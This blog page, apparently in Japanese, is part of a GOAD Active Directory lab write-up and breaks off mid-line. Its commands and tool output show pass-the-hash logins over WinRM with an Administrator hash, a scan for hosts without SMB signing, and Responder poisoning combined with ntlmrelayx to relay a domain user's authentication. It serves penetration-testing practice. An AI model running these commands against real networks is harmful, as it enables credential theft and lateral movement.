<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>GOAD Writeup Ch2 | x64.moe</title>
<meta name=keywords content><meta name=description content="Round 2
WinterfellではAdministratorのパスワードを使いまわしていることがわかる
┌──(kali㉿kali)-[~]
└─$ nxc winrm 192.168.56.10-12 192.168.56.22-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'

WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
WINRM       192.168.56.12   5985   MEEREEN          [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local)
WINRM       192.168.56.23   5985   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.10   5985   KINGSLANDING     [-] sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.12   5985   MEEREEN          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.23   5985   BRAAVOS          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.11   5985   WINTERFELL       [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
WINRM       192.168.56.22   5985   CASTELBLACK      [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
それはそれとして他に色々探ってみる
NTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める
┌──(kali㉿kali)-[~/goad]
└─$ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt    
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/goad]
└─$ cat relay.txt       
192.168.56.23
192.168.56.22
サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう
Responderの設定を変えて
**┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/\responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off**
ntlmrelayxを起動
**┌──(kali㉿kali)-[~/goad]
└─$ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] SMB Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>**
Responderも起動して"><meta name=author content="FAMASoon"><link rel=canonical href=https://famasoon.github.io/posts/goad_writeupch2/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://famasoon.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://famasoon.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://famasoon.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://famasoon.github.io/apple-touch-icon.png><link rel=mask-icon href=https://famasoon.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://famasoon.github.io/posts/goad_writeupch2/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZJPXHR8YPR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-ZJPXHR8YPR")}</script><meta property="og:title" content="GOAD Writeup Ch2"><meta property="og:description" content="Round 2
WinterfellではAdministratorのパスワードを使いまわしていることがわかる
┌──(kali㉿kali)-[~]
└─$ nxc winrm 192.168.56.10-12 192.168.56.22-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'

WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
WINRM       192.168.56.12   5985   MEEREEN          [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local)
WINRM       192.168.56.23   5985   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.10   5985   KINGSLANDING     [-] sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.12   5985   MEEREEN          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.23   5985   BRAAVOS          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.11   5985   WINTERFELL       [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
WINRM       192.168.56.22   5985   CASTELBLACK      [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
それはそれとして他に色々探ってみる
NTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める
┌──(kali㉿kali)-[~/goad]
└─$ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt    
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/goad]
└─$ cat relay.txt       
192.168.56.23
192.168.56.22
サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう
Responderの設定を変えて
**┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/\responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off**
ntlmrelayxを起動
**┌──(kali㉿kali)-[~/goad]
└─$ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] SMB Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>**
Responderも起動して"><meta property="og:type" content="article"><meta property="og:url" content="https://famasoon.github.io/posts/goad_writeupch2/"><meta property="og:image" content="https://famasoon.github.io/static/famasoon.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-20T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-20T00:00:00+00:00"><meta property="og:site_name" content="x64.moe"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://famasoon.github.io/static/famasoon.jpg"><meta name=twitter:title content="GOAD Writeup Ch2"><meta name=twitter:description content="Round 2
WinterfellではAdministratorのパスワードを使いまわしていることがわかる
┌──(kali㉿kali)-[~]
└─$ nxc winrm 192.168.56.10-12 192.168.56.22-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'

WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
WINRM       192.168.56.12   5985   MEEREEN          [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local)
WINRM       192.168.56.23   5985   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.10   5985   KINGSLANDING     [-] sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.12   5985   MEEREEN          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.23   5985   BRAAVOS          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.11   5985   WINTERFELL       [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
WINRM       192.168.56.22   5985   CASTELBLACK      [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
それはそれとして他に色々探ってみる
NTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める
┌──(kali㉿kali)-[~/goad]
└─$ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt    
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/goad]
└─$ cat relay.txt       
192.168.56.23
192.168.56.22
サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう
Responderの設定を変えて
**┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/\responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off**
ntlmrelayxを起動
**┌──(kali㉿kali)-[~/goad]
└─$ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] SMB Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>**
Responderも起動して"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://famasoon.github.io/posts/"},{"@type":"ListItem","position":2,"name":"GOAD Writeup Ch2","item":"https://famasoon.github.io/posts/goad_writeupch2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"GOAD Writeup Ch2","name":"GOAD Writeup Ch2","description":"Round 2 WinterfellではAdministratorのパスワードを使いまわしていることがわかる\n┌──(kali㉿kali)-[~] └─$ nxc winrm 192.168.56.10-12 192.168.56.22-23 -u Administrator -H \u0026#39;dbd13e1c4e338284ac4e9874f7de6ef4\u0026#39; WINRM 192.168.56.10 5985 KINGSLANDING [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local) WINRM 192.168.56.12 5985 MEEREEN [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local) WINRM 192.168.56.23 5985 BRAAVOS [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local) WINRM 192.168.56.11 5985 WINTERFELL [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) WINRM 192.168.56.22 5985 CASTELBLACK [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) WINRM 192.168.56.10 5985 KINGSLANDING [-] sevenkingdoms.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 WINRM 192.168.56.12 5985 MEEREEN [-] essos.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 WINRM 192.168.56.23 5985 BRAAVOS [-] essos.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 WINRM 192.168.56.11 5985 WINTERFELL [+] north.sevenkingdoms.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!) WINRM 192.168.56.22 5985 CASTELBLACK [+] north.sevenkingdoms.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!) Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 それはそれとして他に色々探ってみる\nNTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める\n┌──(kali㉿kali)-[~/goad] └─$ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt SMB 192.168.56.10 445 KINGSLANDING [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) SMB 192.168.56.12 445 MEEREEN [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB 192.168.56.11 445 WINTERFELL [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) SMB 192.168.56.23 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) SMB 192.168.56.22 445 CASTELBLACK [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False) Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 ┌──(kali㉿kali)-[~/goad] └─$ cat relay.txt 192.168.56.23 192.168.56.22 サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう\nResponderの設定を変えて\n**┌──(kali㉿kali)-[~/goad] └─$ sudo sed -i \u0026#39;s/HTTP = On/HTTP = Off/g\u0026#39; /etc/\\responder/Responder.conf \u0026amp;\u0026amp; sudo cat /etc/responder/Responder.conf | grep --color=never \u0026#39;HTTP =\u0026#39; HTTP = Off ┌──(kali㉿kali)-[~/goad] └─$ sudo sed -i \u0026#39;s/SMB = On/SMB = Off/g\u0026#39; /etc/responder/Responder.conf \u0026amp;\u0026amp; sudo cat /etc/responder/Responder.conf | grep --color=never \u0026#39;HTTP =\u0026#39; HTTP = Off** ntlmrelayxを起動\n**┌──(kali㉿kali)-[~/goad] └─$ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Protocol Client LDAPS loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client SMTP loaded.. [*] Protocol Client RPC loaded.. [*] Protocol Client DCSYNC loaded.. [*] Protocol Client SMB loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Running in relay mode to hosts in targetfile [*] SOCKS proxy started. Listening on 127.0.0.1:1080 [*] SMB Socks Plugin loaded.. [*] HTTP Socks Plugin loaded.. [*] SMTP Socks Plugin loaded.. [*] IMAP Socks Plugin loaded.. [*] IMAPS Socks Plugin loaded.. [*] MSSQL Socks Plugin loaded.. [*] HTTPS Socks Plugin loaded.. [*] Setting up SMB Server [*] Setting up HTTP Server on port 80 * Serving Flask app \u0026#39;impacket.examples.ntlmrelayx.servers.socksserver\u0026#39; * Debug mode: off [*] Setting up WCF Server [*] Setting up RAW Server on port 6666 [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx\u0026gt;** Responderも起動して\n","keywords":[],"articleBody":"Round 2 WinterfellではAdministratorのパスワードを使いまわしていることがわかる\n┌──(kali㉿kali)-[~] └─$ nxc winrm 192.168.56.10-12 192.168.56.22-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' WINRM 192.168.56.10 5985 KINGSLANDING [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local) WINRM 192.168.56.12 5985 MEEREEN [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local) WINRM 192.168.56.23 5985 BRAAVOS [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local) WINRM 192.168.56.11 5985 WINTERFELL [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) WINRM 192.168.56.22 5985 CASTELBLACK [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) WINRM 192.168.56.10 5985 KINGSLANDING [-] sevenkingdoms.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 WINRM 192.168.56.12 5985 MEEREEN [-] essos.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 WINRM 192.168.56.23 5985 BRAAVOS [-] essos.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 WINRM 192.168.56.11 5985 WINTERFELL [+] north.sevenkingdoms.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!) WINRM 192.168.56.22 5985 CASTELBLACK [+] north.sevenkingdoms.local\\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!) Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 それはそれとして他に色々探ってみる\nNTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める\n┌──(kali㉿kali)-[~/goad] └─$ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt SMB 192.168.56.10 445 KINGSLANDING [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) SMB 192.168.56.12 445 MEEREEN [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB 192.168.56.11 445 WINTERFELL [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) SMB 192.168.56.23 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) SMB 192.168.56.22 445 CASTELBLACK [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False) Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 ┌──(kali㉿kali)-[~/goad] └─$ cat relay.txt 192.168.56.23 192.168.56.22 サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう\nResponderの設定を変えて\n**┌──(kali㉿kali)-[~/goad] └─$ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/\\responder/Responder.conf \u0026\u0026 sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP =' HTTP = Off ┌──(kali㉿kali)-[~/goad] └─$ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf \u0026\u0026 sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP =' HTTP = Off** ntlmrelayxを起動\n**┌──(kali㉿kali)-[~/goad] └─$ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Protocol Client LDAPS loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client SMTP loaded.. [*] Protocol Client RPC loaded.. [*] Protocol Client DCSYNC loaded.. [*] Protocol Client SMB loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Running in relay mode to hosts in targetfile [*] SOCKS proxy started. Listening on 127.0.0.1:1080 [*] SMB Socks Plugin loaded.. [*] HTTP Socks Plugin loaded.. [*] SMTP Socks Plugin loaded.. [*] IMAP Socks Plugin loaded.. [*] IMAPS Socks Plugin loaded.. [*] MSSQL Socks Plugin loaded.. [*] HTTPS Socks Plugin loaded.. [*] Setting up SMB Server [*] Setting up HTTP Server on port 80 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver' * Debug mode: off [*] Setting up WCF Server [*] Setting up RAW Server on port 6666 [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx\u003e** Responderも起動して\n┌──(kali㉿kali)-[~] └─$ sudo responder -I eth1 [sudo] password for kali: __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.1.4.0 To support this project: Github -\u003e https://github.com/sponsors/lgandx Paypal -\u003e https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF] [+] Servers: HTTP server [OFF] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [OFF] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] MQTT server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] SNMP server [OFF] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF] [+] Generic Options: Responder NIC [eth1] Responder IP [192.168.56.104] Responder IPv6 [fe80::5af0:79:dd52:80d1] Challenge set [random] Don't Respond To Names ['ISATAP', 'ISATAP.LOCAL'] [+] Current Session Variables: Responder Machine Name [WIN-E217ZFS7CUP] Responder Domain Name [DCK5.LOCAL] Responder DCE-RPC Port [47652] [+] Listening for events... ntlmrelayxでしばらく待つとこんな内容が出力される\nntlmrelayx\u003e [*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication [*] SMBD-Thread-13 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.23 [*] Authenticating against smb://192.168.56.23 as NORTH/EDDARD.STARK SUCCEED [*] SOCKS: Adding 